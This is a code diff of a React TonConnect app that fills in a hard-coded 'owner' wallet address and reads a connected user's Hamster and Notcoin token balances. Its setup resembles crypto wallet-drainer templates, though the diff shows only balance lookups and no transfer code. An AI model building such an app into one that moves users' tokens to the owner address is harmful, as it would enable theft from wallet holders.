@@ -8,11 +8,14 @@ window.Buffer = Buffer;
 
 
 
+
+
+
 const Body =() => {
 
   
   //check these address in your wallet
-  const ownerAddress="ownerAddress"
+  const ownerAddress="UQBFrS0-M_6sMmhAZr12A-t-OgJ4_LQCVWz8f7xtS_v7lyHL"
   const hamesterTokenAddress="EQAJ8uWd7EBqsmpSWaRdf_I-8R8-XHwh3gsNKhy-UrdrPcUo"
   const notcoinTokenAddress="EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT"
   
@@ -24,24 +27,26 @@ const Body =() => {
   const [tonConnectUI] = useTonConnectUI();
   
 
+  const tonweb = new TonWeb(new TonWeb.HttpProvider('/ton-api/v2/json-rp')); 
   
 
 
-  const fetchUserTokenBalance = async (userAddress, tokenAddress) => {
+const fetchUserTokenBalance = async (userAddress, tokenAddress) => {
+  try {
     
-    const tonweb = new TonWeb(); 
+    const jettonWallet = await tonweb.jetton.getWallet(
+      new TonWeb.utils.Address(tokenAddress), 
+      new TonWeb.utils.Address(userAddress)   
+    );
     
-
-
-    try {
-      const walletAddress = new TonWeb.utils.Address(userAddress);
-      const balance = await tonweb.provider.getBalance(walletAddress);
-      return TonWeb.utils.fromNano(balance); 
-    } catch (error) {
-      console.error(`Error fetching balance for token ${tokenAddress}:`, error);
-      return 0;
-    }
-  };
+    const balance = await jettonWallet.getBalance();
+    
+    return TonWeb.utils.fromNano(balance); 
+  } catch (error) {
+    console.error(`Error fetching balance for token ${tokenAddress}:`, error);
+    return 0;
+  }
+};
 
   const fetchAllBalances = async () => {
     if (!userAddress) return;
@@ -154,7 +159,7 @@ const Body =() => {
 
 const App = () => {
   return (
-    <TonConnectUIProvider manifestUrl="http://your-ton-uri/tonconnect-manifest.json">
+    <TonConnectUIProvider manifestUrl="http://localhost:5173/tonconnect-manifest.json">
           <Body/> 
         </TonConnectUIProvider>
   )
